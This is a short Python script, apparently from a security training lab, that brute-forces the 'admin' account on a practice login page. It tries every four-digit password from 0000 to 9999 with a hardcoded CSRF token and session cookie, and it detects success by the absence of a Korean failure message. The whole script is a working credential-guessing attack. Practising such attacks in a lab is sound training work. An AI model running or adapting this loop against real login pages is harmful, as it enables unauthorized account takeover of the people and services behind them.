import requests

url = 'https://elms2.skinfosec.co.kr:8110/practice/practice02/login'

res = requests.get(url)

param = {
    "_csrf":"595610a3-8565-48c4-b072-881ac6f06368", "memberid":"admin",
    "password":"1234"
}

jsession = {
    "JSESSIONID":"501E555D7510DA10E38871719F95041A"
}

contype = {
    "Content-Type": "application/x-www-form-urlencoded"
}

for pw in range(0000, 10000):
    pwstr = str(pw).zfill(4)
    param["password"] = pwstr
    res = requests.post(url, data=param, cookies=jsession, headers=contype)
    if "실패했습니다." in res.text:
        print(f'로그인 실패 :' + pwstr)
    else:
        print(f'로그인 성공 :' + pwstr)
        break


